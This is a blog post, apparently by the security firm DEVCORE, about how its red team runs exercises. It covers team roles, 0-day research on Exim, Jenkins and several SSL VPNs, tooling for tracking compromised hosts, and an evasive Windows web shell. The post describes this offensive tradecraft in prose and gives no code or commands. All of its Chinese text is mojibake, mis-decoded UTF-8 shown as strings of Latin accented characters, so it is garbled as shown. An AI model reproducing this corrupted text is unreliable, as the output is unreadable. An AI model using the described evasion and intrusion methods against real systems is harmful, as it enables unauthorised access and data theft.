&lt;p&gt;ç´…éšŠæ¼”ç·´ç›®æ¨™é€šå¸¸æ˜¯ä¸€å€‹æƒ…å¢ƒï¼Œä¾‹å¦‚ï¼šé§­å®¢æœ‰æ²’æœ‰è¾¦æ³•å–å¾—æ°‘çœ¾å€‹è³‡ç”šè‡³æ˜¯ä¿¡ç”¨å¡å¡è™Ÿï¼Ÿåœ¨æ¼”ç·´éç¨‹ä¸­ç´…éšŠæœƒç„¡æ‰€ä¸ç”¨å…¶æ¥µçš„å˜—è©¦é©—è­‰ä¼æ¥­åœ¨ä¹çš„æƒ…å¢ƒæœ‰æ²’æœ‰å¯èƒ½ç™¼ç”Ÿã€‚ä»¥å‰›å‰›çš„ä¾‹å­ä¾†èªªï¼Œæˆ‘å€‘æœƒæƒ³è¾¦æ³•æ‰¾åˆ°ä¸€æ¢è·¯å¾‘å–å¾—å­˜æ”¾é€™äº›è¨Šæ¯çš„è³‡æ–™åº«ï¼Œå»é©—è­‰æœ‰æ²’æœ‰è¾¦æ³•å–å¾—å€‹è³‡åŠå¡è™Ÿã€‚ä¸€èˆ¬ä¾†èªªï¼Œå¡è™Ÿéƒ¨åˆ†éƒ½æœƒç¶“éåŠ å¯†ï¼Œå› æ­¤åœ¨æ‹¿ä¸‹è³‡æ–™åº«å¾Œæˆ‘å€‘ä¹Ÿæœƒå˜—è©¦çœ‹çœ‹æœ‰æ²’æœ‰è¾¦æ³•é‚„åŸé€™äº›å¡è™Ÿã€‚æœ‰æ™‚å€™é™¤äº†æ‰¾åˆ°é‚„åŸçš„æ–¹æ³•ï¼Œæˆ‘å€‘ç”šè‡³æœƒåœ¨éç¨‹ä¸­ç™¼ç¾å…¶ä»–è·¯å¾‘å¯å–å¾—å¡è™Ÿï¼Œå¯èƒ½æ˜¯å·¥ç¨‹å¸«çš„ debug è³‡è¨Šæœƒè¨˜éŒ„å¡è™Ÿï¼Œæˆ–æ˜¯å‚™ä»½æª”åœ¨ NAS è£¡é¢æœ‰å®Œæ•´å¡è™Ÿï¼Œé€™äº›å¯èƒ½æ˜¯é€£è³‡å®‰è² è²¬äººéƒ½ä¸çŸ¥é“çš„è³‡è¨Šï¼Œä¹Ÿæ˜¯ä¼æ¥­è©•ä¼°é¢¨éšªçš„ç›²é»ã€‚&lt;/p&gt;

&lt;p&gt;åˆ°é€™é‚Šï¼Œç´…éšŠæ¼”ç·´çš„æ•ˆç›Šå°±å¾ˆæ˜é¡¯äº†ï¼Œç´…éšŠèƒ½å”åŠ©ä¼æ¥­å…¨ç›¤è©•ä¼°æ½›åœ¨çš„é‡å¤§é¢¨éšªï¼Œä¸å†åƒéå»åªæ˜¯å–®ä¸€é¢å‘çš„æ¸¬è©¦ç‰¹å®šç¶²ç«™ã€‚é™¤äº†æ‰¾åˆ°å¼±é»ï¼Œç´…éšŠæ›´åœ¨ä¹å¹«ä¼æ¥­&lt;strong&gt;é©—è­‰å…¥ä¾µçš„å¯è¡Œæ€§&lt;/strong&gt;ï¼Œæ–¹ä¾¿ä¼æ¥­è©•ä¼°é¢¨éšªä»¥åŠæ“¬å®šé˜²ç¦¦ç­–ç•¥ã€‚æœ€å¾Œï¼Œç´…éšŠå¾€å¾€ä¹Ÿèƒ½å¤ åœ¨æ¼”ç·´éç¨‹ç•¶ä¸­&lt;strong&gt;æ‰¾å‡ºä¼æ¥­é¢¨éšªè©•ä¼°å¿½ç•¥çš„åœ°æ–¹&lt;/strong&gt;ï¼Œä¾‹å¦‚å‰›å‰›ä¾‹å­æåˆ°çš„å‚™ä»½ NASï¼Œå°±å¯èƒ½æ˜¯æ²’æœ‰åˆ—å…¥æ ¸å¿ƒç³»çµ±ä½†åˆç›¸ç•¶é‡è¦çš„ä¼ºæœå™¨ï¼Œé€™ä¸€å¡Šä¹Ÿæ˜¯ DEVCORE é€™å¹¾å¹´ä¾†ç¢ºå¯¦å¹«åŠ©åˆ°å®¢æˆ¶çš„åœ°æ–¹ã€‚&lt;/p&gt;

&lt;h2 id=&quot;devcore-ç´…éšŠçš„ç·¨åˆ¶&quot;&gt;DEVCORE ç´…éšŠçš„ç·¨åˆ¶&lt;/h2&gt;

&lt;p&gt;åŸºæœ¬ä¸Šï¼ŒDEVCORE çš„ç´…éšŠæˆå“¡éƒ½æ˜¯å¯ä»¥ç¨ç•¶ä¸€é¢çš„ï¼Œåœ¨åŸ·è¡Œä¸€èˆ¬å°ˆæ¡ˆæ™‚æˆå“¡é–“ä¸¦æ²’æœ‰é¡¯è‘—å·®ç•°ã€‚ä½†åœ¨æ¼”ç·´ç¯„åœæ¯”è¼ƒå¤§çš„ç‹€æ³ä¸‹ï¼Œå°±æœƒé–‹å§‹æœ‰æ˜é¡¯çš„åˆ†å·¥ä½œæ¥­ï¼Œå„çµ„ä¹Ÿæœƒå°ˆç²¾æŠ€èƒ½å¢åŠ åœ˜éšŠæ•ˆç‡ã€‚ç›®å‰æˆ‘å€‘çš„ç·¨åˆ¶å…±åˆ†ç‚ºäº”çµ„ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç°¡å–®ä»‹ç´¹è·è²¬å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Intelligence (åµæŸ¥)ï¼Œè² è²¬æƒ…å ±åµæŸ¥ï¼Œä»–å€‘æœƒå»æ”¶é›†è·Ÿç›®æ¨™æœ‰é—œçš„æ‰€æœ‰è³‡è¨Šï¼ŒåŒ…æ‹¬ IP ç¶²æ®µã€ç¶²ç«™å€‹åˆ¥ä½¿ç”¨çš„æŠ€è¡“ï¼Œç”šè‡³æ˜¯æ´©æ¼çš„å¸³è™Ÿå¯†ç¢¼ã€‚&lt;/li&gt;
  &lt;li&gt;Special Force (ç‰¹æ”»)ï¼Œæœ‰æ¯”è¼ƒå¼·å¤§çš„æ”»æ“Šèƒ½åŠ›ï¼Œä¸»è¦è² è²¬æ‰“ç ´ç¾æ³ï¼Œä¾‹å¦‚æ”»ä¸‹ç¬¬ä¸€å€‹æ“šé»ã€æ‹¿ä¸‹å¦ä¸€å€‹ç¶²æ®µã€æˆ–æ˜¯ä¸»æ©Ÿçš„ææ¬Šã€‚&lt;/li&gt;
  &lt;li&gt;Regular Army (å¸¸è¦)ï¼Œè² è²¬æ‹¿ä¸‹æ“šé»å¾Œæƒè•©æ•´å€‹æˆ°å ´ï¼Œå˜—è©¦æ©«å‘ç§»å‹•ï¼Œæœƒç›¡é‡å¤šå»ºç«‹å¹¾å€‹æ“šé»è®“ç‰¹æ”»çµ„æœ‰æ›´å¤šè³‡æºæœä»»å‹™ç›®æ¨™é‚é€²ã€‚&lt;/li&gt;
  &lt;li&gt;Suppert (æ”¯æ´)ï¼Œé‡è¦çš„å¾Œå‹¤å·¥ä½œï¼Œç¶­æŒæ“šé»çš„å¯ç”¨æ€§ï¼ŒåŒæ™‚ä¹Ÿè¦è§€å¯Ÿè¨˜éŒ„æ•´å€‹æˆ°æ³ï¼Œæœ€æ¸…æ¥šå…¨å±€æˆ°æ³ã€‚&lt;/li&gt;
  &lt;li&gt;Research (ç ”ç©¶)ï¼Œå¹³æ™‚ç ”ç©¶å„ç¨®åœ¨ç´…éšŠä¸­æœƒç”¨åˆ°çš„æ­¦å™¨ï¼Œæ¼”ç·´æ™‚æœŸç¢°åˆ°å…·æˆ°ç•¥åƒ¹å€¼çš„ç³»çµ±ï¼ŒæœƒæŠ•å…¥è³‡æºé–‹æ¡ 0-dayã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;devcore-ç´…éšŠçš„é€²åŒ–&quot;&gt;DEVCORE ç´…éšŠçš„é€²åŒ–&lt;/h2&gt;

&lt;p&gt;æ‰€è¬‚çš„é€²åŒ–ï¼Œå°±æ˜¯ç¢°åˆ°äº†å•é¡Œï¼Œæƒ³è¾¦æ³•å¼·åŒ–ä¸¦ä¸”è§£æ±ºï¼Œé‚£æˆ‘å€‘é‡åˆ°äº†å“ªäº›å•é¡Œå‘¢ï¼Ÿ&lt;/p&gt;

&lt;h3 id=&quot;å¦‚ä½•æ‰¾åˆ°ä¸€å€‹çªç ´é»&quot;&gt;å¦‚ä½•æ‰¾åˆ°ä¸€å€‹çªç ´é»ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;é€™æ˜¯å¤§å®¶æœ€å¸¸ç¢°åˆ°çš„å•é¡Œï¼Œè¬äº‹èµ·é ­é›£ï¼Œæ€éº¼æ¨£æ‰¾åˆ°ç¬¬ä¸€å€‹çªç ´é»ï¼Ÿé€™å€‹å•é¡Œåœ¨ç´…éšŠæ¼”ç·´ç•¶ä¸­é›£åº¦æœƒæ›´é«˜ï¼Œå› ç‚ºæœ‰è¦æ¨¡çš„ä¼æ¥­æ—©å·²æŠ•å…¥è³‡æºåœ¨è³‡å®‰æª¢æ¸¬å’Œé˜²è­·ä¸Šï¼Œæˆ‘å€‘è¦æ€éº¼æ¨£å¾å±¤å±¤é˜²ç¦¦ç•¶ä¸­æ‰¾åˆ°å¼±é»ï¼Ÿè¦èƒ½æ‰¾åˆ°åˆ¥äººæ‰¾ä¸åˆ°çš„å¼±é»ï¼Œæ¸¬è©¦æ€ç¶­å’Œæ–¹æ³•ä¸€å®šè¦è·Ÿåˆ¥äººä¸ä¸€æ¨£ã€‚æ–¼æ˜¯ï¼Œæˆ‘å€‘æŠ•å…¥è³‡æºåœ¨åµæŸ¥ã€ç‰¹æ”»ã€ç ”ç©¶çµ„ï¼šåµæŸ¥éƒ¨åˆ†ç ”ç©¶äº†ä¸åŒçš„åµæŸ¥æ–¹æ³•å’Œä¾†æºï¼Œä¸¦ä¸”é–‹ç™¼è‡ªå·±çš„å·¥å…·è®“åµæŸ¥æ›´æœ‰æ•ˆç‡ï¼›æˆ‘å€‘çš„ç‰¹æ”»çµ„ä¹Ÿä¸æ–·å¼·åŒ–è‡ªå·±çš„æ”»æ“Šèƒ½åŠ›ï¼›æœ€é‡è¦çš„ï¼Œæˆ‘å€‘è®“ç ”ç©¶äººå“¡é–‹å§‹é‡å°æˆ‘å€‘å¸¸ç¢°åˆ°çš„ç›®æ¨™é€²è¡Œç ”ç©¶ï¼Œé–‹ç™¼ç´…éšŠæœƒç”¨åˆ°çš„æ­¦å™¨æˆ–æŠ€å·§ã€‚&lt;/p&gt;

&lt;p&gt;é€™é‚Šç‰¹åˆ¥æƒ³è¦åˆ†äº«ç ”ç©¶çµ„çš„æˆæœï¼Œå› ç‚ºæˆ‘å€‘æœƒå»é–‹æ¡ä¸€äº›åŸºç¤è¨­æ–½çš„ 0-dayï¼Œåœ¨è² è²¬ä»»çš„æ­éœ²å¾Œï¼Œæœƒå°‡ 1-day ç”¨æ–¼æ¼”ç·´ä¸­ï¼Œé€™ç¨®æ¨¡å¼å°åœ‹å¤–ç´…éšŠä¾†èªªç®—æ˜¯ç›¸ç•¶å°‘è¦‹ã€‚ç‚ºäº†èƒ½å¹«åŠ©åˆ°ç´…éšŠï¼Œç ”ç©¶çµ„å¹³æ™‚çš„ç ”ç©¶æ–¹å‘ï¼Œé€šå¸¸éƒ½æ˜¯æ‰¾ä¼æ¥­å¤–ç¶²å¯ä»¥ç¢°åˆ°çš„é€šç”¨æœå‹™ï¼Œä¾‹å¦‚éƒµä»¶ä¼ºæœå™¨ã€Jenkinsã€SSL VPNã€‚æˆ‘å€‘æ‰¾çš„å¼±é»éƒ½æ˜¯ä»¥ä¸ç”¨èªè­‰ã€å¯å–å¾—ä¼ºæœå™¨æ§åˆ¶æ¬Šç‚ºå„ªå…ˆï¼Œç›®å‰å·²å…¬é–‹çš„æœ‰ï¼š&lt;a href=&quot;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&quot;&gt;Exim&lt;/a&gt;ã€&lt;a href=&quot;https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;Jenkins&lt;/a&gt;ã€&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Palo Alto GlobalProtect&lt;/a&gt;ã€&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;FortiGate&lt;/a&gt;ã€&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;Pulse Secure&lt;/a&gt;ã€‚é€™äº›æˆæœåœ¨æ¼”ç·´ç•¶ä¸­éƒ½æœ‰éå¸¸éå¸¸é«˜çš„æˆ°ç•¥åƒ¹å€¼ï¼Œç”šè‡³å¯ä»¥èªªæŒæ§äº†é€™äº›ä¼ºæœå™¨å¹¾ä¹å°±èƒ½é–“æ¥æ§åˆ¶ä¼æ¥­çš„å¤§åŠã€‚&lt;/p&gt;

&lt;p&gt;è€Œé€™äº›ç ”ç©¶æˆæœï¼Œä¹Ÿæ„å¤–çš„è¢«åœ‹å¤–æ‰€æ³¨æ„åˆ°ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;PortSwigger é€£çºŒå…©å¹´å¹´åº¦åå¤§ç¶²ç«™æ”»æ“ŠæŠ€è¡“è©•é¸å† è» (&lt;a href=&quot;https://portswigger.net/blog/top-10-web-hacking-techniques-of-2017&quot;&gt;2017&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/blog/top-10-web-hacking-techniques-of-2018&quot;&gt;2018&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;é€£çºŒä¸‰å¹´ DEFCON &amp;amp; Black Hat USA ç™¼è¡¨ (&lt;a href=&quot;https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages&quot;&gt;2017&lt;/a&gt;, &lt;a href=&quot;https://www.blackhat.com/us-18/briefings/schedule/index.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-days-out-10346&quot;&gt;2018&lt;/a&gt;, &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/index.html#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;2019&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;å°ç£ç¬¬ä¸€å€‹æ‹¿åˆ° PWNIE AWARD çé …ï¼šPwnie for Best Server-Side Bug (å¹´åº¦æœ€ä½³ä¼ºæœå™¨æ¼æ´) (&lt;a href=&quot;https://pwnies.com/archive/2018/nominations/&quot;&gt;2018 å…¥åœ&lt;/a&gt;, &lt;a href=&quot;https://pwnies.com/winners/&quot;&gt;2019 å¾—ç&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ç›®æ¨™ä¸Šè¬å°å¦‚ä½•ç™¼æ®ç´…éšŠæ•ˆç›Š&quot;&gt;ç›®æ¨™ä¸Šè¬å°ï¼Œå¦‚ä½•ç™¼æ®ç´…ã€ŒéšŠã€æ•ˆç›Šï¼Ÿ&lt;/h3&gt;

&lt;p&gt;å‰é¢é äº†åµæŸ¥ã€ç‰¹æ”»ã€ç ”ç©¶çµ„çš„æˆæœå–å¾—äº†é€²å…¥é»ã€‚ä¸‹ä¸€å€‹å•é¡Œï¼Œæ˜¯åœ¨æˆ‘å€‘éå»çš„ç¶“é©—ä¸­ï¼Œæœ‰éå¤šæ¬¡æ¼”ç·´çš„ç¯„åœæ˜¯ä¸Šè¬å°é›»è…¦ï¼Œæˆ‘å€‘è¦æ€æ¨£åšæ‰èƒ½ç™¼æ®åœ˜éšŠä½œæˆ°çš„æ•ˆç›Šå‘¢ï¼Ÿæœƒæœ‰é€™å€‹å•é¡Œæ˜¯å› ç‚º&lt;strong&gt;æ•¸é‡ç´š&lt;/strong&gt;ï¼Œå¦‚æœç¯„åœåªæœ‰åå€‹ç¶²ç«™å¾ˆå®¹æ˜“æ‰¾ç›®æ¨™ï¼Œä½†æ˜¯ç•¶ç¶²ç«™è®Šå¤šçš„æ™‚å€™ï¼Œå°±å¾ˆé›£æ¨™è¨»è¨è«–æˆ‘å€‘è¦æ”»æ“Šçš„ç›®æ¨™ã€‚æˆ–æ˜¯ç•¶å¤§å®¶è¦åŒæ­¥é€²åº¦çš„æ™‚å€™ï¼Œæ¯å€‹äººçš„é€²åº¦éƒ½å¾ˆå¤šï¼Œå¾ˆé›£æœ‰å€‹åœ°æ–¹åˆ†äº«ä¼ºæœå™¨è³‡è¨Šï¼Œè®“å…¶ä»–äººèƒ½æ¥çºŒä»»å‹™ã€‚&lt;/p&gt;

&lt;p&gt;éå»æˆ‘å€‘ä½¿ç”¨é¡ä¼¼ Trello çš„ç³»çµ±è¨˜éŒ„æ¯å°ä¼ºæœå™¨çš„ç‹€æ³ï¼Œåœ¨ç¯„åœè¼ƒå°çš„æ™‚å€™å¾ˆæ–¹ä¾¿å¥½ç”¨ï¼Œä½†æ˜¯ç•¶è³‡æ–™é‡ä¸€å¤§å°±æœƒé¡¯å¾—å¾ˆé›£æ“ä½œã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å› æ­¤ï¼Œæˆ‘å€‘è‡ªè¡Œé–‹ç™¼äº†ç³»çµ±å»è§£æ±ºç›¸é—œå•é¡Œã€‚åˆ†äº«ä¸€äº›æˆ‘å€‘è¨­è¨ˆç³»çµ±çš„å¿…è¦åŸå‰‡ä¾›å¤§å®¶åƒè€ƒï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ä¼ºæœå™¨åˆ—è¡¨å¯æ¨™ç±¤ã€æ’åºã€å…¨æ–‡æœå°‹ï¼Œç«åŠ›é›†ä¸­çš„ä¼ºæœå™¨å¿…é ˆè¦è‡ªå‹•åœ¨é¡¯çœ¼è™•ï¼Œçœå»é¡å¤–æœå°‹æ™‚é–“ã€‚&lt;/li&gt;
  &lt;li&gt;è¦å¯è‡ªå‹•å»ºç«‹ä¸»æ©Ÿé—œä¿‚åœ–ï¼Œæ–¹ä¾¿åœ˜éšŠè¨è«–æˆ°æ³ã€‚&lt;/li&gt;
  &lt;li&gt;å„²å­˜çµæ§‹åŒ–è³‡è¨Šè€Œééå»çš„ç´”å­—ä¸²ï¼Œä¾‹å¦‚é€™å°æ©Ÿå™¨é–‹çš„æœå‹™è³‡è¨Šã€æ‹¿ shell çš„æ–¹å¼ã€å·²æ»²é€çš„å¸³è™Ÿå¯†ç¢¼ã€‚æ–¹ä¾¿å¿«é€Ÿé‡æ¸…ç›®å‰é€²åº¦ä»¥åŠäº‹å¾Œåˆ†æã€‚&lt;/li&gt;
  &lt;li&gt;å»ºç«‹ shell ä¸»æ§å°ï¼Œæ–¹ä¾¿æˆå“¡ä¸€éµå–å¾— shell æ“ä½œã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¦å¤–é‚„æœ‰ä¸€å€‹å•é¡Œï¼Œç´…éšŠæˆå“¡é€™éº¼å¤šï¼Œæˆ°å ´åˆåˆ†æ•£ï¼Œå¦‚æœæƒ³è¦æŠŠæˆ‘å€‘åšéçš„æ¸¬è©¦éç¨‹è¨˜éŒ„ä¸‹ä¾†ï¼Œä¸æ˜¯æœƒå¾ˆè¤‡é›œå—ï¼Ÿæ‰€ä»¥æˆ‘å€‘å¦å¤–å¯«äº† plugin è¨˜éŒ„ web çš„æ”»æ“Šæµé‡ã€ä»¥åŠè¨˜éŒ„æˆ‘å€‘åœ¨ shell ä¸‹éçš„æŒ‡ä»¤å’Œä¼ºæœå™¨å›å‚³çš„çµæœï¼Œé€™äº›è¨˜éŒ„ç”šè‡³æ¯”å®¢æˆ¶çš„ access_log å’Œ bash_history é‚„è©³ç´°ã€‚æ­¤å¤–ï¼Œé‡å°æ¯å€‹ç›®æ¨™ä¼ºæœå™¨ï¼Œæˆ‘å€‘ä¹Ÿæœƒç‰¹åˆ¥è¨˜éŒ„åœ¨ä¸Šé¢æ‰€åšéçš„é‡è¦è¡Œç‚ºï¼Œä¾‹å¦‚ï¼šæ”¹äº†ä»€éº¼è¨­å®šï¼Œæ–°å¢æˆ–åˆªé™¤äº†ä»€éº¼æª”æ¡ˆï¼Œæ–¹ä¾¿æˆ‘å€‘é‚„æœ‰å®¢æˆ¶è¿½è¹¤ã€‚è¦åšé€™æ¨£çš„å®¢è£½åŒ–è¨˜éŒ„å…¶å¯¦æ˜¯å¾ˆç¹ç‘£çš„ï¼Œå°é‚£äº›ç¿’æ…£æ–¼è‡ªå‹•åŒ–è§£æ±ºäº‹æƒ…çš„é§­å®¢æ›´æ˜¯ï¼Œä½†æˆ‘å€‘å°±æ˜¯å …æŒåšå¥½é€™æ¨£çš„ç´€éŒ„ï¼Œå³ä½¿å®¢æˆ¶æ²’æœ‰è¦æ±‚ï¼Œæˆ‘å€‘é‚„æ˜¯æœƒè©³å¯¦è¨˜éŒ„æ¯å€‹æ­¥é©Ÿï¼Œä»¥å‚™ä¸æ™‚ä¹‹éœ€ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ä¼æ¥­æœ‰é˜²ç¦¦è¨­å‚™æˆ–æ©Ÿåˆ¶&quot;&gt;ä¼æ¥­æœ‰é˜²ç¦¦è¨­å‚™æˆ–æ©Ÿåˆ¶ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;è§£æ±ºäº†çªç ´é»å’Œå¤šäººåˆä½œçš„å•é¡Œï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘é¢è‡¨åˆ°ç¬¬ä¸‰å€‹å•é¡Œï¼Œä¼æ¥­æœ‰é˜²è­·æªæ–½ï¼åœ¨ç ”è¨æœƒä¸­æˆ‘èˆ‰äº†å¹¾å€‹è¼ƒå®¢è£½çš„çœŸå¯¦é˜²ç¦¦æ¡ˆä¾‹ï¼Œèªªæ˜æˆ‘å€‘é™¤äº†å¸¸è¦‹çš„é˜²ç¦¦è¨­å‚™å¤–ä¹Ÿæ“æœ‰å¾ˆå¤šè·Ÿé˜²ç¦¦æ©Ÿåˆ¶äº¤æ‰‹çš„ç¶“é©—ã€‚æˆ‘å€‘æœƒç ”ç©¶æ¯ç¨®é˜²ç¦¦çš„ç‰¹æ€§åŠ ä»¥ç¹éæˆ–åˆ©ç”¨ï¼Œç”šè‡³æœƒå¯«å·¥å…·å»èº²é¿åµæ¸¬ï¼Œæœ€è¿‘æ¯”è¼ƒç¶“å…¸çš„æ˜¯åœ˜éšŠåšäº†åœ¨ Windows ä¼ºæœå™¨ä¸Šçš„ Web shellï¼Œå®ƒå¯ä»¥åšåˆ° WAF æŠ“ä¸åˆ°ï¼Œé˜²æ¯’è»Ÿé«”æŠ“ä¸åˆ°ï¼Œä¹Ÿä¸æœƒæœ‰ eventlog è¨˜éŒ„ï¼Œåˆ©ç”¨é€™å€‹å·¥å…·å¯ä»¥ç„¡è²ç„¡æ¯æ”¶é›†ä¼ºæœå™¨ä¸Šæˆ‘å€‘éœ€è¦çš„è³‡æ–™ã€‚ç•¶ç„¶ï¼Œæˆ‘å€‘ä¸æ˜¯ç„¡æ•µçš„ï¼Œä¸€äº›è¼ƒåº•å±¤çš„åµæ¸¬æ©Ÿåˆ¶é‚„æ˜¯æœƒç„¡æ³•ç¹éã€‚é€™é‚Šæˆ‘ç›´æ¥è¬›æˆ‘å€‘é€²åŒ–åˆ°ç›®å‰çš„æº–å‰‡ï¼šåœ¨é¢å°ä¼ºæœå™¨é˜²ç¦¦æ©Ÿåˆ¶ï¼Œæˆ‘å€‘èƒ½éš±åŒ¿çš„ï¼Œä¸€å®šåšåˆ°çµ•å°çš„éš±åŒ¿ï¼Œç„¡æ³•èº²çš„ï¼Œå°±æŠŠæµç¨‹æœ€ä½³åŒ–ï¼Œç¸®çŸ­åšäº‹æƒ…çš„æ™‚é–“ï¼Œä¾‹å¦‚æ§åˆ¶åœ¨äº”åˆ†é˜å…§ææ¬Šæ‹¿åˆ°é—œéµè³‡æ–™ï¼Œå°±ç®—è¢«åˆ¥äººæŠ“åˆ°ä¹Ÿæ²’é—œä¿‚ï¼Œå› ç‚ºè©²æ‹¿çš„è³‡æ–™ä¹Ÿæ‹¿åˆ°äº†ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç´…éšŠæˆå“¡æ‡‰å…·å‚™çš„ç‰¹è³ª&quot;&gt;ç´…éšŠæˆå“¡æ‡‰å…·å‚™çš„ç‰¹è³ª&lt;/h2&gt;

&lt;p&gt;è¦èƒ½å¤ åœ¨ç´…éšŠæ¼”ç·´ä¸­æœ‰çªå‡ºæˆæœï¼Œæˆ‘è¦ºå¾—æˆå“¡ç‰¹è³ªæ˜¯æ»¿é—œéµçš„ä¸€å€‹é»ã€‚ä»¥ä¸‹æ•´ç†äº†å¹¾å€‹æˆ‘å¾æˆ‘å€‘ç´…éšŠå¤¥ä¼´è§€å¯Ÿåˆ°çš„ç‰¹è³ªè·Ÿå¤§å®¶åˆ†äº«ï¼Œå¦‚æœå°‡ä¾†æœ‰æ‰“ç®—å¾äº‹ç´…éšŠå·¥ä½œï¼Œæˆ–æ˜¯ä¼æ¥­å·²ç¶“æ‰“ç®—é–‹å§‹æˆç«‹å…§éƒ¨ç´…éšŠï¼Œé€™äº›ç‰¹è³ªå¯èƒ½å¯ä»¥ä½œç‚ºä¸€äº›åƒè€ƒã€‚&lt;/p&gt;

&lt;h3 id=&quot;æƒ³åƒåŠ›&quot;&gt;æƒ³åƒåŠ›&lt;/h3&gt;

&lt;p&gt;ç¬¬ä¸€å€‹æ˜¯æƒ³åƒåŠ›ï¼Œç‚ºä»€éº¼æœƒæé€™å€‹ç‰¹è³ªï¼Œå› ç‚ºç¾åœ¨è³‡å®‰æ„è­˜æ…¢æ…¢å¼·åŒ–ï¼Œè¦é ä¸€æ‹›æ‰“å¤©ä¸‹æ˜¯ä¸å¤ªæœ‰æ©Ÿæœƒçš„ï¼Œå°¤å…¶æ˜¯ç´…éšŠæ¼”ç·´é€™éº¼æœ‰è®ŠåŒ–çš„å·¥ä½œã€‚è¦æœ‰æˆæœä¸€å®šè¦å·§å¦™çš„çµ„åˆåˆ©ç”¨æˆ–æ˜¯ç¹éæ‰æœ‰æ©Ÿæœƒã€‚&lt;/p&gt;

&lt;p&gt;ç›´æ¥èˆ‰å€‹ä¾‹å­ï¼Œæˆ‘å€‘åœ¨å…¬å¸ƒ Pulse Secure VPN çš„&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;ç ”ç©¶ç´°ç¯€&lt;/a&gt;å¾Œï¼Œæœ‰äººåœ¨ twitter ä¸Š&lt;a href=&quot;https://twitter.com/_trou_/status/1168529031177867267&quot;&gt;è¡¨ç¤º&lt;/a&gt;é‚£å€‹é—œéµç”¨ä¾† RCE çš„ argument injection é»ä¹‹å‰ä»–æœ‰æ‰¾åˆ°ï¼Œåªæ˜¯ç„¡æ³•åˆ©ç”¨æ‰€ä»¥å®˜æ–¹ä¹Ÿæ²’æœ‰ä¿®ã€‚ç¢ºå¯¦æˆ‘å€‘æ‰¾åˆ°çš„åœ°æ–¹ç›¸åŒï¼Œä¸éæˆ‘å€‘é æƒ³åƒåŠ›æ‰¾åˆ°äº†ä¸€å€‹å¯åˆ©ç”¨åƒæ•¸ä¸¦æ­é… Perl çš„ç‰¹æ€§ä¸²å‡ºäº† RCEã€‚&lt;br /&gt;
å¦ä¸€å€‹ä¾‹å­æ˜¯ &lt;a href=&quot;https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;Jenkins ç ”ç©¶&lt;/a&gt;è£¡é¢çš„ä¸€ç’°ï¼Œæˆ‘å€‘åœ¨ç¹éèº«åˆ†èªè­‰ä¹‹å¾Œç™¼ç¾æœ‰ä¸€å€‹åŠŸèƒ½æ˜¯åœ¨æª¢æŸ¥ä½¿ç”¨è€…è¼¸å…¥çš„ç¨‹å¼èªæ³•æ­£ä¸æ­£ç¢ºã€‚ä¼ºæœå™¨æ€æ¨£å»åˆ¤æ–·èªæ³•æ­£ä¸æ­£ç¢ºï¼Ÿæœ€ç°¡å–®çš„æ–¹æ³•å°±æ˜¯ç›´æ¥å»ç·¨è­¯çœ‹çœ‹ï¼Œå¯ä»¥ç·¨è­¯æˆåŠŸå°±ä»£è¡¨èªæ³•æ­£ç¢ºã€‚æ‰€ä»¥æˆ‘å€‘ç ”ç©¶äº†å¯ä»¥åœ¨ã€ç·¨è­¯éšæ®µã€å‘½ä»¤åŸ·è¡Œçš„æ–¹æ³•ï¼Œè®“ä¼ºæœå™¨åœ¨å˜—è©¦åˆ¤æ–·èªæ³•æ˜¯å¦æ­£ç¢ºçš„åŒæ™‚åŸ·è¡Œæˆ‘å€‘çš„æŒ‡ä»¤ã€‚é€™å€‹æ‰‹æ³•éå»æ²’æœ‰äººæéï¼Œç®—æ˜¯é‹ç”¨æƒ³åƒåŠ›çš„ä¸€å€‹ç¶“å…¸æ¡ˆä¾‹ã€‚&lt;/p&gt;

